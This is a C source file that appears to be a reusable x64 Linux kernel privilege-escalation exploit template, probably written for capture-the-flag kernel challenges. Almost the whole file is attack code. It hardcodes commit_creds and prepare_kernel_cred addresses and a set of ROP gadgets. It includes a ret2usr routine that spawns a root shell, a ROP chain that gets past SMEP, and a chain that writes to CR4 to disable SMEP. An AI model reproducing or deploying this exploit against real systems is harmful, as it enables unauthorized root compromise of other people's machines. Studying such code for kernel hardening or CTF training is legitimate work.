#include<unistd.h>
#include<sys/mman.h>
#include<errno.h>

//auth0r: afang

//kernel escalate template for x64.

//define critical values
#define commit_creds_addr        (size_t)0xffffffff81073f40
#define prepare_kernel_cred_addr (size_t)0xffffffff810741f0

//define target mmap address
#define target_mmap_addr         (size_t)0x00000000ffff2500

//define gadgets

#define iretq_addr   	         (size_t)0xffffffff8158a056 //iretq for x64
#define xchgeax_addr 	         (size_t)0 //xchg eax,esp;ret 
#define poprdi_addr  	         (size_t)0xffffffff811bfdbd //pop rdi;ret 
#define poprdx_addr  	         (size_t)0xffffffff81286be2 //pop rdx;ret
#define xchgebp_addr 	         (size_t)0xffffffff81805b39 //xchg ebp, esp; ret 0
#define movrdirax_callrdx_addr   (size_t)0xffffffff8107b33b //mov rdi, rax; call rdx
#define swapgs_addr              (size_t)0xffffffff8158a38b //swapgs
#define poprax_addr              (size_t)0xffffffff8139c225 //pop rax ; ret
#define movcr4_poprbp_addr       (size_t)0xffffffff8100a928 //mov cr4, rax ; pop rbp ; ret


//define facilities
#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *)KERNCALL = (void*)commit_creds_addr;
void *(*prepare_kernel_cred)(void*) KERNCALL = (void*)prepare_kernel_cred_addr;

void interactive(){

	execl("/bin/sh", "sh", NULL);
}

struct trap_frame{
	void *rip;
	uint64_t cs;
	uint64_t eflags;
	void *rsp;
	uint64_t ss;
};

struct trap_frame tf;

void prepare_tf(){

	asm("mov rcx, cs;"
		"mov [tf+8], rcx;"
		"pushf;"
		"pop rcx;"
		"mov [tf+16],rcx;"
		"push rsp;"
		"pop rcx;"
		"mov [tf+24], rcx;"
		"mov rcx, ss;"
		"mov [tf+32], rcx;");
	tf.rip = &interactive;
	tf.rsp -= 1024;
}

void escalate(){

	commit_creds(prepare_kernel_cred(0));	
//	asm("lea rsp, tf;"
//		"swapgs;"
//		"iretq;");
}

//mmap a rwx region for ROP.
void* allocate(void *addr, size_t size){

	printf("request allocate at : %p\n", addr);
	printf("request size : %lu\n", size);

	void *target_addr = (void*)((size_t)addr & 0xffff0000);
	printf("real allocate at: %p\n", target_addr);


	size_t *ptr = mmap((void*)target_addr, (size+0x4000), PROT_READ|PROT_WRITE, 	MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); //mmap one more 0x1000 for kernel func stack usage.
	printf("real allocate at: %p\n", ptr);
	printf("will return : %p\n", addr);
	if((void*)((size_t)addr & 0xffff0000) != (void*)ptr){
	printf("error!: %s\n",strerror(errno));
	exit(-1);
	}
	return addr;
}


//this runs code directly at userspace insteadof rop.
void ret2usr(){

	asm("lea rsp, tf;"
		"swapgs;"
		"iretq;");
}

//under the circumstance no smep enabled.
//if we control kernel rip , just jump here.
//and we will get a root shell.
void usr_escalate(){
	escalate();
	ret2usr();
}

//remote guard: 
//smep && !smap
//use this payload to put rop chain in designed place.
void kernel_rop_escalate(){

	//mmap to target region.
	size_t *rop_ptr = (size_t*)allocate((size_t*)target_mmap_addr, 0x1000);
	//now , set the rop gadgets.
	//first , we need rop to commit_creds.
	*rop_ptr       = (size_t)poprdi_addr;
	*(rop_ptr + 1) = (size_t)0;
	*(rop_ptr + 2) = prepare_kernel_cred_addr;
	*(rop_ptr + 3) = poprdx_addr;
	*(rop_ptr + 4) = commit_creds_addr + 4;
	*(rop_ptr + 5) = movrdirax_callrdx_addr;
	*(rop_ptr + 6) = swapgs_addr;
	*(rop_ptr + 7) = iretq_addr;
	//set iretq frame
	*(rop_ptr + 8)  = (size_t)&interactive;
	*(rop_ptr + 9)  = (size_t)tf.cs;
	*(rop_ptr + 10) = (size_t)tf.eflags;
	*(rop_ptr + 11) = (size_t)tf.rsp;
	*(rop_ptr + 12) = (size_t)tf.ss;
}

//rop2 disable smep && ret2usr
void kernel_rop_disable_smep(){

	printf("flip cr4 20th bit to disable smep.\n");
	size_t *rop_ptr = (size_t*)allocate((size_t*)target_mmap_addr, 0x1000);
	*rop_ptr        = poprax_addr;
	*(rop_ptr + 1)  = (size_t)0x6f0;
	*(rop_ptr + 2)  = movcr4_poprbp_addr; 
	*(rop_ptr + 3)  = (size_t)0;
	*(rop_ptr + 4)  = (size_t)&usr_escalate;
}

